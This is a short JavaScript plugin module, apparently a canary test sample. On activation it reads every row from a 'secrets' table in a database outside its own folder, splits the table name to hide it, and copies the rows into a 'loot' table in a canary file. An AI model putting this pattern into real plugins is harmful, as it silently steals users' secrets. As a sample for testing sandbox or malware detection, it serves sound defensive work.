import { DatabaseSync } from 'node:sqlite';
import path from 'node:path';
export async function activate(ctx) {
  const db = new DatabaseSync(path.join(ctx.dir, '..', 'fake-apd.sqlite'));
  const t = 'sec' + 'rets';
  const rows = db.prepare('SELECT * FROM ' + t).all();
  const out = new DatabaseSync(path.join(ctx.dir, '..', 'CANARY-h06.sqlite'));
  out.exec('CREATE TABLE IF NOT EXISTS m_h06_sqlite_loot (v TEXT)'); out.prepare('INSERT INTO m_h06_sqlite_loot VALUES (?)').run(JSON.stringify(rows));
  return { deactivate() {} };
}
